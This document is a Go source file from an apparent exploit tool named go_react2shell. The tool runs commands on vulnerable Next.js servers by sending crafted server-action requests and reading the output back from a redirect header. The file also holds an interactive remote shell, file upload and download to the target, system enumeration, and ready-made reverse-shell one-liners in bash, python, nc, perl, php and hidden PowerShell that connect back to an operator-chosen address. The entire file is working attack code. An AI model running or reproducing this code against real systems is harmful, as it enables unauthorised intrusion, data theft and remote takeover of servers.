package exploit

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"

	"go_react2shell/internal/config"
	"go_react2shell/internal/payload"
)

// Exploiter executes commands on vulnerable hosts
type Exploiter struct {
	config *config.Config
	client *http.Client
}

// Result holds the result of an exploit attempt
type Result struct {
	Success    bool
	Output     string
	Error      string
	StatusCode int
	RawOutput  string
}

// ReverseShellType defines the type of reverse shell
type ReverseShellType string

const (
	ReverseShellBash       ReverseShellType = "bash"
	ReverseShellPython     ReverseShellType = "python"
	ReverseShellNC         ReverseShellType = "nc"
	ReverseShellPerl       ReverseShellType = "perl"
	ReverseShellPHP        ReverseShellType = "php"
	ReverseShellPowershell ReverseShellType = "powershell"
)

// New creates a new Exploiter instance
func New(cfg *config.Config) *Exploiter {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: !cfg.VerifySSL,
		},
		DisableKeepAlives: true,
	}

	client := &http.Client{
		Timeout:   cfg.Timeout,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	return &Exploiter{
		config: cfg,
		client: client,
	}
}

// Execute runs a command on the target host
func (e *Exploiter) Execute(host, command string) Result {
	result := Result{}

	host = normalizeHost(host)
	if host == "" {
		result.Error = "invalid or empty host"
		return result
	}

	body, contentType := payload.BuildExploitPayload(command, e.config.Windows)

	headers := map[string]string{
		"User-Agent":               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
		"Next-Action":              "x",
		"X-Nextjs-Request-Id":      "b5dce965",
		"Content-Type":             contentType,
		"X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
	}

	for k, v := range e.config.CustomHeaders {
		headers[k] = v
	}

	// Try each path
	paths := e.config.Paths
	if len(paths) == 0 {
		paths = []string{"/"}
	}

	for _, path := range paths {
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}
		targetURL := host + path

		resp, respBody, err := e.sendPayload(targetURL, headers, body)
		if err != nil {
			result.Error = err.Error()
			continue
		}

		result.RawOutput = respBody

		if resp != nil {
			result.StatusCode = resp.StatusCode
			output := extractOutput(resp, respBody)
			if output != "" {
				result.Success = true
				result.Output = output
				return result
			}
		}
	}

	if result.Error == "" {
		result.Error = "exploit failed - host may not be vulnerable"
	}
	return result
}

func (e *Exploiter) sendPayload(targetURL string, headers map[string]string, body string) (*http.Response, string, error) {
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
	if err != nil {
		return nil, "", err
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := e.client.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer func() { _ = resp.Body.Close() }()

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	return resp, string(respBody), nil
}

func extractOutput(resp *http.Response, _ string) string {
	// Check X-Action-Redirect header for output
	redirectHeader := resp.Header.Get("X-Action-Redirect")
	if redirectHeader == "" {
		return ""
	}

	// Extract value after "a="
	re := regexp.MustCompile(`/login\?a=([^;]*)`)
	matches := re.FindStringSubmatch(redirectHeader)
	if len(matches) < 2 {
		return ""
	}

	output := matches[1]
	// URL decode the output
	decoded, err := url.QueryUnescape(output)
	if err != nil {
		return output
	}
	return decoded
}

func normalizeHost(host string) string {
	host = strings.TrimSpace(host)
	if host == "" {
		return ""
	}
	if !strings.HasPrefix(host, "http://") && !strings.HasPrefix(host, "https://") {
		host = "https://" + host
	}
	return strings.TrimRight(host, "/")
}

// InteractiveShell starts an interactive shell session
func (e *Exploiter) InteractiveShell(host string) error {
	fmt.Printf("\n[*] Starting interactive shell on %s\n", host)
	fmt.Println("[*] Type 'exit' or 'quit' to exit")
	fmt.Println("[*] Special commands: !download <remote> <local>, !upload <local> <remote>, !revshell <ip> <port>")
	fmt.Println("[*] Note: Each command runs in a separate process")
	fmt.Println()

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("$ ")
		command, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		command = strings.TrimSpace(command)
		if command == "" {
			continue
		}
		if command == "exit" || command == "quit" {
			fmt.Println("[*] Exiting shell...")
			break
		}

		// Handle special commands
		if strings.HasPrefix(command, "!download ") {
			parts := strings.Fields(command)
			if len(parts) != 3 {
				fmt.Println("[!] Usage: !download <remote_path> <local_path>")
				continue
			}
			if err := e.DownloadFile(host, parts[1], parts[2]); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			} else {
				fmt.Printf("[+] File downloaded to %s\n", parts[2])
			}
			continue
		}

		if strings.HasPrefix(command, "!upload ") {
			parts := strings.Fields(command)
			if len(parts) != 3 {
				fmt.Println("[!] Usage: !upload <local_path> <remote_path>")
				continue
			}
			if err := e.UploadFile(host, parts[1], parts[2]); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			} else {
				fmt.Printf("[+] File uploaded to %s\n", parts[2])
			}
			continue
		}

		if strings.HasPrefix(command, "!revshell ") {
			parts := strings.Fields(command)
			if len(parts) != 3 {
				fmt.Println("[!] Usage: !revshell <ip> <port>")
				continue
			}
			fmt.Printf("[*] Sending reverse shell to %s:%s...\n", parts[1], parts[2])
			result := e.SendReverseShell(host, parts[1], parts[2], ReverseShellBash)
			if result.Success {
				fmt.Println("[+] Reverse shell payload sent")
			} else {
				fmt.Printf("[!] Error: %s\n", result.Error)
			}
			continue
		}

		if command == "!sysinfo" {
			info := e.GetSystemInfo(host)
			fmt.Println(info)
			continue
		}

		result := e.Execute(host, command)
		if result.Success {
			fmt.Println(result.Output)
		} else {
			fmt.Printf("[!] Error: %s\n", result.Error)
		}
	}

	return nil
}

// SendReverseShell sends a reverse shell payload to the target
func (e *Exploiter) SendReverseShell(host, ip, port string, shellType ReverseShellType) Result {
	var cmd string

	switch shellType {
	case ReverseShellBash:
		cmd = fmt.Sprintf("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'", ip, port)
	case ReverseShellPython:
		cmd = fmt.Sprintf(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, ip, port)
	case ReverseShellNC:
		cmd = fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", ip, port)
	case ReverseShellPerl:
		cmd = fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, ip, port)
	case ReverseShellPHP:
		cmd = fmt.Sprintf(`php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'`, ip, port)
	case ReverseShellPowershell:
		cmd = fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("%s",%s);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, ip, port)
	default:
		cmd = fmt.Sprintf("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'", ip, port)
	}

	return e.Execute(host, cmd)
}

// DownloadFile downloads a file from the remote server
func (e *Exploiter) DownloadFile(host, remotePath, localPath string) error {
	// Read file as base64
	cmd := fmt.Sprintf("base64 %s", remotePath)
	if e.config.Windows {
		cmd = fmt.Sprintf("certutil -encodehex %s NUL 1 | findstr /v \"===\" ", remotePath)
	}

	result := e.Execute(host, cmd)
	if !result.Success {
		return fmt.Errorf("failed to read remote file: %s", result.Error)
	}

	// Decode base64 content
	content := strings.TrimSpace(result.Output)
	decoded, err := base64.StdEncoding.DecodeString(content)
	if err != nil {
		return fmt.Errorf("failed to decode file content: %w", err)
	}

	// Write to a local file
	if err := os.WriteFile(localPath, decoded, 0644); err != nil {
		return fmt.Errorf("failed to write local file: %w", err)
	}

	return nil
}

// UploadFile uploads a file to the remote server
func (e *Exploiter) UploadFile(host, localPath, remotePath string) error {
	// Read local file
	content, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read local file: %w", err)
	}

	// Encode as base64
	encoded := base64.StdEncoding.EncodeToString(content)

	// Upload in chunks to avoid command length limits
	chunkSize := 4096
	for i := 0; i < len(encoded); i += chunkSize {
		end := i + chunkSize
		if end > len(encoded) {
			end = len(encoded)
		}
		chunk := encoded[i:end]

		var cmd string
		if i == 0 {
			cmd = fmt.Sprintf("echo '%s' > /tmp/.upload_tmp", chunk)
		} else {
			cmd = fmt.Sprintf("echo '%s' >> /tmp/.upload_tmp", chunk)
		}

		result := e.Execute(host, cmd)
		if !result.Success {
			return fmt.Errorf("failed to upload chunk: %s", result.Error)
		}
	}

	// Decode and move to the final location
	cmd := fmt.Sprintf("base64 -d /tmp/.upload_tmp > %s && rm /tmp/.upload_tmp", remotePath)
	if e.config.Windows {
		cmd = fmt.Sprintf("certutil -decode /tmp/.upload_tmp %s && del /tmp/.upload_tmp", remotePath)
	}

	result := e.Execute(host, cmd)
	if !result.Success {
		return fmt.Errorf("failed to finalize upload: %s", result.Error)
	}

	return nil
}

// GetSystemInfo gathers system information from the target
func (e *Exploiter) GetSystemInfo(host string) string {
	var info strings.Builder
	info.WriteString("\n=== System Information ===\n")

	commands := []struct {
		name string
		cmd  string
	}{
		{"OS Info", "uname -a 2>/dev/null || ver"},
		{"Hostname", "hostname"},
		{"Current User", "whoami"},
		{"User ID", "id 2>/dev/null"},
		{"Working Directory", "pwd"},
		{"IP Addresses", "ip addr 2>/dev/null || ifconfig 2>/dev/null || ipconfig"},
	}

	for _, c := range commands {
		result := e.Execute(host, c.cmd)
		if result.Success && result.Output != "" {
			info.WriteString(fmt.Sprintf("\n[%s]\n%s\n", c.name, result.Output))
		}
	}

	return info.String()
}

// TestVulnerability checks if the host is vulnerable before exploitation
func (e *Exploiter) TestVulnerability(host string) bool {
	result := e.Execute(host, "echo VULN_TEST_OK")
	return result.Success && strings.Contains(result.Output, "VULN_TEST_OK")
}
